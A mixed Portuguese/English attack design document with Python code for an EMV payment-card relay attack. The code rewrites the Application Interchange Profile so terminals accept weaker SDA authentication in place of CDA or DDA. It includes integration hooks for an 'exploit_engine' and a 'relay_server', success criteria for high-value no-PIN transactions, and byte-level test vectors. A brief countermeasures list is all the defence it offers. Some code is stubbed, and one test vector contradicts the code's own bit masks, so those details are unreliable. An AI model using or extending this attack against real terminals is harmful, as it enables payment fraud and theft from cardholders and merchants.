# Attack Vector 1: Selective Authentication Downgrade Attack

## Concept
**Nome:** "Downgrade Criptográfico Seletivo"
**Alvo:** Lógica de seleção de método de autenticação do terminal EMV
**Objetivo:** Forçar um terminal a aceitar autenticação mais fraca (CDA → DDA → SDA) através da manipulação de campos AIP em ataques de relay.

## Technical Description

### Attack Flow
1. **Interception Phase**: O relay intercepta o GET_PROCESSING_OPTIONS response
2. **AIP Manipulation**: Modifica o campo AIP para downgrade do método de autenticação
3. **Terminal Exploitation**: Terminal aceita a autenticação mais fraca sem validação adequada
4. **Transaction Completion**: Transação de alto valor processada com segurança inadequada

### Vulnerable Components
- **AIP Field**: Application Interchange Profile (Tag 82)
- **TSI Field**: Transaction Status Information (complementar ao AIP)
- **Terminal Authentication Logic**: Falta de validação cruzada entre capacidades anunciadas

### Implementation Details

#### Core Exploit Logic (Python)
```python
class AuthDowngradeAttack:
    def __init__(self, relay_server):
        self.relay_server = relay_server
        self.target_auth_methods = ['SDA', 'DDA', 'CDA']
        
    def intercept_gpo_response(self, apdu_response):
        """
        Intercepta GPO response e modifica AIP para downgrade
        """
        # Parse TLV structure
        tlv_data = self.parse_tlv(apdu_response)
        
        # Locate AIP (Tag 82)
        aip_tag = tlv_data.get('82')  # Application Interchange Profile
        if not aip_tag:
            return apdu_response
            
        # Extract current authentication method
        current_auth = self.extract_auth_method(aip_tag)
        
        # Force downgrade to weakest available
        if current_auth == 'CDA':
            modified_aip = self.modify_aip_to_sda(aip_tag)
        elif current_auth == 'DDA':
            modified_aip = self.modify_aip_to_sda(aip_tag)
        else:
            return apdu_response  # Already SDA
            
        # Rebuild APDU with modified AIP
        return self.rebuild_apdu(tlv_data, {'82': modified_aip})
    
    def modify_aip_to_sda(self, original_aip):
        """
        Modifica AIP para forçar SDA (autenticação mais fraca)
        AIP Byte 1, Bits:
        - Bit 6 (0x40): SDA supported
        - Bit 5 (0x20): DDA supported  
        - Bit 1 (0x02): CDA supported
        """
        aip_bytes = bytearray(original_aip)
        
        # Clear CDA and DDA bits, set only SDA
        aip_bytes[0] &= ~0x02  # Clear CDA bit
        aip_bytes[0] &= ~0x20  # Clear DDA bit
        aip_bytes[0] |= 0x40   # Set SDA bit
        
        return bytes(aip_bytes)
    
    def validate_downgrade_success(self, terminal_response):
        """
        Verifica se o terminal aceitou o downgrade
        """
        # Check if terminal proceeded with SDA
        return 'SDA' in self.extract_processing_method(terminal_response)

# Integration with relay framework
class RelayServerExtension:
    def __init__(self):
        self.downgrade_attack = AuthDowngradeAttack(self)
        
    def process_apdu(self, apdu_data, direction):
        if direction == 'CARD_TO_TERMINAL':
            if self.is_gpo_response(apdu_data):
                return self.downgrade_attack.intercept_gpo_response(apdu_data)
        return apdu_data
```

#### Terminal Validation Bypass
```python
def bypass_terminal_validation(self, aip_modified):
    """
    Explora falhas na validação de consistência do terminal
    """
    # Exploit 1: Inconsistent AIP vs AFL
    # Terminal não valida se AFL suporta método anunciado no AIP
    
    # Exploit 2: Missing cross-validation
    # Ausência de validação cruzada entre AIP e Card capabilities
    
    # Exploit 3: Timing window exploitation
    # Manipulação durante janela entre SELECT e GPO
    
    return True
```

## Framework Integration

### Modifications Required

#### In `exploit_engine` module:
```python
# Add to exploit_engine/attacks/auth_downgrade.py
class AuthDowngradeModule:
    def __init__(self, core_toolkit):
        self.tlv_parser = core_toolkit.tlv_parser
        self.apdu_builder = core_toolkit.apdu_builder
        
    def execute_attack(self, target_terminal, victim_card):
        # Implementation here
        pass
```

#### In `relay_server` module:
```python
# Add to relay_server/processors/attack_processor.py
def apply_auth_downgrade(self, apdu_data):
    if self.is_target_apdu(apdu_data, 'GPO_RESPONSE'):
        return self.auth_downgrade.process(apdu_data)
    return apdu_data
```

## Success Criteria
- Terminal aceita SDA para transações de alto valor
- Bypass de validações de integridade do terminal
- Tempo de ataque < 100ms (dentro da janela de relay)

## Countermeasures
- Validação cruzada obrigatória entre AIP e AFL
- Verificação de consistência com capabilities anunciadas
- Timeout reduzido para respostas de autenticação

## Testing Vectors
1. **Mastercard CDA → SDA**: AIP 0x5C00 → 0x4C00
2. **Visa DDA → SDA**: AIP 0x2000 → 0x4000  
3. **High-value NoPIN**: Combinação com transações > limite CVM